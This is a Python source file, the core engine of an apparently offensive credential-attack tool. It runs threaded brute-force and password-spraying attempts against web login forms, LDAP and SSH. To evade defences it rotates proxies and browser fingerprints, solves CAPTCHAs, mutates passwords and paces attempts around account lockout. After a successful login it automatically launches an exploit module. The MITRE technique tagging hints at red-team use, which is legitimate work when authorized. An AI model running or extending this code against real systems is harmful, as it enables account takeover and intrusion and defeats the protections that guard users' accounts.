"""Orchestrates attack attempts across worker threads.

Threads, not asyncio: each browser session (SeleniumBase CDP Chrome, or Camoufox
via Playwright) owns its own event loop internally, so real concurrency comes
from independent worker threads rather than one shared asyncio loop.

Execution model: N worker threads drain a shared task queue. Each worker owns a
live "identity" for browser (HTTP_FORM) targets - one proxy + one live browser
session bundling one fingerprint/locale - and reuses it for up to
config.identity.requests_per_identity attempts, then rotates. It also rotates
early on BLOCKED / CAPTCHA / ERROR. IP and fingerprint rotate together (coupled
identity). Protocol targets (LDAP, SSH) are stateless per attempt and keep no
live session. Account lockout cooldown and jittered exponential backoff live in a
shared, thread-safe BackoffController.
"""
from __future__ import annotations

import queue
import threading
from collections.abc import Iterable
from datetime import datetime

from attack_logging.attack_logger import AttackLogger
from browser.cdp_session import CDPSession
from browser.camoufox_session import CamoufoxSession
from browser.login_flows import http_form
from captcha.solver import make_solver
from config import Config
from core import ldap_attack, ssh_attack
from core.backoff import BackoffController
from core.mutation_engine import mutate
from exploit.manager import make_exploit
from evasion.rate_limiter import RateLimiter
from mitre.ttp_mapper import technique_for
from models import AttackType, AttemptResult, Credential, LoginType, Outcome, Target
from proxy.proxy_manager import ProxyManager


class AttackEngine:
    def __init__(
        self,
        config: Config,
        logger: AttackLogger,
        proxy_manager: ProxyManager | None = None,
    ):
        self.config = config
        self.logger = logger
        self.proxy_manager = proxy_manager
        self.rate_limiter = RateLimiter(config.rate_limit)
        self.backoff = BackoffController(config.backoff)
        self.captcha_solver = make_solver(config.captcha)
        self.exploit = make_exploit(getattr(config, "exploit", None))
        self._exploit_lock = threading.Lock()
        self._exploit_done = False

    def run(
        self,
        target: Target,
        credentials: Iterable[Credential],
        attack_type: AttackType,
        apply_mutation: bool = False,
    ) -> list[AttemptResult]:
        technique_id = technique_for(attack_type)

        if self.exploit is not None and not self.config.exploit.base_url and target.base_url:
            self.config.exploit.base_url = target.base_url.rsplit("/", 1)[0] + "/"

        def expand(cred: Credential) -> Iterable[tuple[Credential, str | None]]:
            if not apply_mutation:
                yield cred, None
                return
            for variant in mutate(cred.password):
                mutation_label = None if variant == cred.password else "mutated"
                yield Credential(cred.username, variant, cred.source), mutation_label

        task_q: queue.Queue = queue.Queue()
        n_tasks = 0
        for cred in credentials:
            for variant_cred, mutation_label in expand(cred):
                task_q.put((variant_cred, mutation_label))
                n_tasks += 1

        results: list[AttemptResult] = []
        results_lock = threading.Lock()
        n_workers = max(1, min(self.config.concurrency.max_workers, n_tasks))

        threads = [
            threading.Thread(
                target=self._worker,
                args=(target, attack_type, technique_id, task_q, results, results_lock),
                daemon=True,
            )
            for _ in range(n_workers)
        ]
        for t in threads:
            t.start()
        for t in threads:
            t.join()
        return results

    def _open_browser_session(self, proxy):
        cfg = self.config
        if cfg.browser.backend == "camoufox":
            session = CamoufoxSession(cfg.browser, cfg.camoufox, proxy=proxy)
        else:
            session = CDPSession(cfg.browser, proxy=proxy)
        session.__enter__()
        return session

    def _maybe_exploit(self, credential) -> dict:
        """Lancia l'exploit sulla credenziale valida (una sola volta se run_once).
        Non solleva mai: ritorna i metadata dell'esito da loggare."""
        cfg = self.config.exploit
        with self._exploit_lock:
            if getattr(cfg, "run_once", True) and self._exploit_done:
                return {"exploit_outcome": "skipped", "exploit_detail": "run_once"}
            self._exploit_done = True
        try:
            res = self.exploit.run(credential.username, credential.password)
            return res.as_meta()
        except Exception as exc:
            return {"exploit_outcome": "error", "exploit_detail": str(exc)}

    @staticmethod
    def _close_session(session) -> None:
        if session is not None:
            try:
                session.__exit__(None, None, None)
            except Exception:
                pass

    def _worker(
        self,
        target: Target,
        attack_type: AttackType,
        technique_id: str,
        task_q: queue.Queue,
        results: list,
        results_lock: threading.Lock,
    ) -> None:
        is_browser = target.login_type == LoginType.HTTP_FORM

        session = None
        proxy = None
        identity_count = 0
        budget = 0
        rotate = False

        def emit(credential, mutation_label, outcome, latency_ms, error, meta, proxy_addr, delay_ms):
            res = AttemptResult(
                timestamp=datetime.now(),
                target_name=target.name,
                attack_type=attack_type,
                username=credential.username,
                password=credential.password,
                outcome=outcome,
                latency_ms=latency_ms,
                delay_applied_ms=delay_ms,
                proxy=proxy_addr,
                mutation_applied=mutation_label,
                technique_id=technique_id,
                error=error,
                metadata=meta,
            )
            self.logger.log(res)
            with results_lock:
                results.append(res)

        try:
            while True:
                try:
                    credential, mutation_label = task_q.get_nowait()
                except queue.Empty:
                    break

                account_key = f"{target.name}:{credential.username}"
                try:
                    decision = self.backoff.before_attempt(account_key)
                    if decision.skip:
                        emit(
                            credential, mutation_label, Outcome.LOCKED, 0.0, None,
                            {
                                "skipped": True,
                                "reason": decision.reason,
                                "cooldown_remaining_s": round(decision.cooldown_remaining_s or 0.0, 1),
                            },
                            None, 0.0,
                        )
                        continue

                    rate_delay_s = self.rate_limiter.wait()

                    if is_browser:
                        if session is None or rotate or identity_count >= budget:
                            self._close_session(session)
                            proxy = self.proxy_manager.get_proxy() if self.proxy_manager else None
                            session = self._open_browser_session(proxy)
                            identity_count = 0
                            budget = self.config.identity.next_budget()
                            rotate = False
                        outcome, latency_ms, error, meta = http_form.attempt_login(
                            session, target, credential, self.config.browser.timeout_s,
                            captcha_cfg=self.config.captcha,
                            captcha_solver=self.captcha_solver,
                        )
                        identity_count += 1
                        used_proxy = proxy
                    else:
                        used_proxy = None
                        if target.login_type == LoginType.LDAP:
                            outcome, latency_ms, error, meta = ldap_attack.attempt_bind(target, credential)
                        else:
                            outcome, latency_ms, error, meta = ssh_attack.attempt_login(target, credential)

                    self.backoff.record(outcome, meta, account_key)

                    if outcome == Outcome.ERROR and used_proxy and self.proxy_manager:
                        self.proxy_manager.mark_dead(used_proxy)
                    if is_browser and outcome in (Outcome.BLOCKED, Outcome.ERROR):
                        rotate = True
                    elif is_browser and outcome == Outcome.SUCCESS:
                        if not session.reset_session_state():
                            rotate = True

                    meta = dict(meta)
                    if decision.delay_applied_s:
                        meta["backoff_delay_s"] = round(decision.delay_applied_s, 1)
                    if is_browser:
                        meta["identity_attempt"] = identity_count
                        meta["identity_budget"] = budget

                    if outcome == Outcome.SUCCESS and self.exploit is not None:
                        meta.update(self._maybe_exploit(credential))

                    delay_applied_ms = (decision.delay_applied_s + rate_delay_s) * 1000
                    emit(
                        credential, mutation_label, outcome, latency_ms, error, meta,
                        used_proxy.address if used_proxy else None, delay_applied_ms,
                    )
                except Exception as exc:
                    self._close_session(session)
                    session = None
                    rotate = True
                    emit(
                        credential, mutation_label, Outcome.ERROR, 0.0, str(exc),
                        {"error_stage": "session"}, None, 0.0,
                    )
                finally:
                    task_q.task_done()
        finally:
            self._close_session(session)
